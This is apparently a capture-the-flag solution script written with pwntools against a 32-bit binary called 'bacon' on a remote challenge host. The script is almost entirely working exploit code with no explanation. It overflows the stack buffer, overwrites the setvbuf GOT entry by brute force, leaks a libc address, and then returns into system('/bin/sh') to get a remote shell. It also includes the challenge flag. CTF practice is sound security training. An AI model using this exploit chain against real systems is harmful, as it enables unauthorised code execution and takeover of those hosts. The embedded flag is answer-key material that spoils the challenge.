#!/usr/bin/env python3

from pwn import *

exe = ELF("./bacon")
libc = ELF("./libc6_2.31-0ubuntu9_i386.so")
ld = ELF("./ld-2.31.so")

context.binary = exe


def conn():
    return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})

#flag{don't_forget_to_take_out_the_grease}
#This exploit requires Bruteforcing.

#p = conn()
p = remote("jh2i.com", 50032)

offset = 1036
main = 0x8049292
overflow = 0x804925d

payload  = b'M'*offset
payload += p32(exe.plt['read'])
payload += p32(main)
payload += p32(0x0)
payload += p32(exe.got['setvbuf'])
payload += p32(0x2)

pause()
p.sendline(payload)
pause()
p.send(p16(0xecd0))

payload  = b'M'*offset
payload += p32(exe.plt['setvbuf'])
payload += p32(main)
payload += p32(exe.got['read'])

p.recv(4)
leak = u32(p.recv(4))
libc_base = leak - 0x1ead67
log.info("libc leak @ 0x%x", leak)
log.info("libc base @ 0x%x", libc_base)

for _ in range(3):
    print(">>>>>> ", p.recvline())

payload  = b'M'*offset
payload += p32(libc_base + libc.sym['system'])
payload += b'MMMM'
payload += p32(libc_base + next(libc.search(b'/bin/sh')))

p.sendline(payload)

p.interactive()

